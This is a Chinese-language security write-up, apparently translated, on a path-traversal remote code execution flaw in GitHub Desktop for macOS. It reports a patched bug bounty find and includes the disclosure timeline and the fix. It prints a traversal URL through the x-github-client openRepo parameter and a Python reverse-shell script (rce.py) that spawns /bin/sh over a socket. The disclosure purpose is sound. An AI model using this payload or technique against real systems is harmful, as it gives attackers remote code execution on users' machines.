***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![what-is-github-1-1.png](https://image.3001.net/images/20190118/1547816201_5c41cd096e4e1.png!small)2018年，我有幸受邀参加了HackerOne在赌城拉斯维加斯举办的，赏金超过50万美金的H1-702黑客马拉松大赛。本次大赛的测试目标包括GitHub，对我个人来说，我平时喜欢对一些常用软件开展漏洞挖掘，有了这个基础，我就把GitHub定为这次比赛中我的测试对象。最终，我发现了GitHub
Desktop程序在OSX系统下的一个远程代码执行（RCE）漏洞，但却被认定为超出测试范围！好在，GitHub众测项目中有这么一句”偶尔，我们会根据具体情况酌情奖励一些例外的漏洞报告“，我也获得了GitHub官方的不菲赏金。**

## 漏洞发现

我们可以在GitHub官方的漏洞致谢榜 -[ https://bounty.github.com/](https://bounty.github.com/)
来查看一些已经发现并作过披露的漏洞，我注意到，其中有一外名为[@zhuowei](http://twitter.com/zhuowei)
的安全研究员，在2017年发现并上报过一个GitHub Desktop相关的远程代码执行（RCE）漏洞：

![github-desktop-rce1.png](https://image.3001.net/images/20190118/1547815854_5c41cbae53282.png!small)如果有类似的漏洞发现，可以肯定的说，它已经被修复了。但是不是针对每种操作系统都做了修复了呢？好吧，大家可能也见过这种情况：

![github-desktop-rce2.png](https://image.3001.net/images/20190118/1547815875_5c41cbc32e9a6.png!small)有了上述披露漏洞为基础，我就开始研究起了x-github-client://，这是GitHub
Desktop常用的URI机制，它支持的一种操作是openRepo，它可以自动打开某个存储库（repository）中的指定文件。如果该库在当前GitHub
Desktop中不存在，程序会提示用户进行克隆（Clone）后再打开文件，如下：

> x-github-client://openRepo/[https://github.com/github/training-> kit?branch=master&filepath=README.md](https://github.com/github/training-> kit?branch=master&filepath=README.md)  
>

如果我们构造的文件路径参数如下会怎样呢：

> "../../../../../../../../../../../Applications/Calculator.app" ?

这样的URL路径将会打开系统的计算器程序，这样一来，就能摆脱出存储库（repository）目录，在文件系统中执行或打开任意程序或文件。然而，由于存储库（repository）中包含了针对OSX系统的应用app，这种应用app是一种特定的包目录格式。所以，我首先想到的就是，OSX系统对这种应用app从互联网上下载且存在的检测机制，由于app应用是通过Git克隆的，操作系统不会提示用户确认此操作。那么，GitHub
Desktop是如何来实现这种app应用的下载呢，其中的根本机制是什么呢？我们先来看看GitHub Desktop的以下两个源码：

    
    
    app/src/main-process/main.ts...
    ipcMain.on(
        'show-item-in-folder',
        (event: Electron.IpcMessageEvent, { path }: { path: string }) => {
            ...
            if (stats.isDirectory()) {
                openDirectorySafe(path)
            }
            else {
                shell.showItemInFolder(path)
        }
    ...
    app/src/main-process/shell.ts
    
    
    import { shell } from 'electron';
    export function openDirectorySafe(path: string) {
      if (__DARWIN__) {
        const directoryURL = Url.format({
          pathname: path,
          protocol: 'file:',
          slashes: true,
        })
        shell.openExternal(directoryURL)
      } else {
        shell.openItem(path)
      }
    }

原来在在OSX系统中，系统文件目录路径被转换成了file:/// 的URL来打开，而且GitHub
Desktop还默认应用了Electron前端框架的shell.openExternal()函数来打开URL。

## POC

有了以上的发现，我尝试着来进行编写漏洞利用代码，我用Pyinstaller的Python方式构造了一个反弹shell，并把它托管在我Github上名为[github-desktop-poc](https://github.com/0xACB/github-desktop-poc/)的库中，其中，主要的漏洞利用脚本rce.py为以下代码，它触发了目标系统计算器，连接目标系统1337端口，然后打开目标系统目录：

    
    
    import socket,subprocess,os;
    os.system("open -a calculator.app")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("localhost",1337));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);

如果此前GitHub Desktop中没有克隆过 github-desktop-poc
这个库，那么在接下来的步骤中需要点击出现的Clone按钮，进行克隆，在进行这个操作行为时，我们构造在库中的特定Payload文件就会被间接请求执行了；如果此前GitHub
Desktop中克隆过 github-desktop-poc 这个库，那么，最终的漏洞利用完全无需与用户交互，就能实现攻击，如视频的后半部份演示那样。

看不到？点[这里](https://v.qq.com/x/page/h08306927el.html)

攻击场景为：攻击者可以在他自己的Github库中托管一个OSX
app，然后在这个app中构造进入一个恶意链接，如在一些特定项目或README.md文件中，然后，按照上述漏洞利用方法，就能针对安装有GitHub
Desktop的目标OSX系统实现远程代码执行了。

这种一键式的RCE攻击需要具备以下要求：

> OSX系统的GitHub Desktop克隆过恶意库；  
> 信任GitHub Desktop URLs，并能总能打开恶意app中相关的各种类型URL链接。

## 漏洞修复

Github官方的修复非常简单，也就是在上述提到的app/src/main-process/main.ts中，添加了一行代码：if (!__DARWIN__
&& stats.isDirectory()) ，以此来判断不是OSX系统，最终代码才能往下执行（DARWIN为苹果开放源代码操作系统的简称）：

## ![github-desktop-rce3.png](https://image.3001.net/images/20190118/1547816149_5c41ccd5ec738.png!small)漏洞上报进程

> 2018/08/19 以HackerOne 漏洞编号397045上报到GitHub官方
>
> 2018/08/20 漏洞分类
>
> 2018/08/25 漏洞修复 并发布GitHub Desktop v1.3.4版本
>
> 2018/08/27 报告关闭并获得赏金
>
> 2018/08/27 获得H1-702赛事方的额外奖励 无限GitHub个人存储库的优惠券

 ***参考来源：[pwning](https://pwning.re/2018/12/04/github-desktop-rce/)，clouds编译，转载请注明来自FreeBuf.COM**  

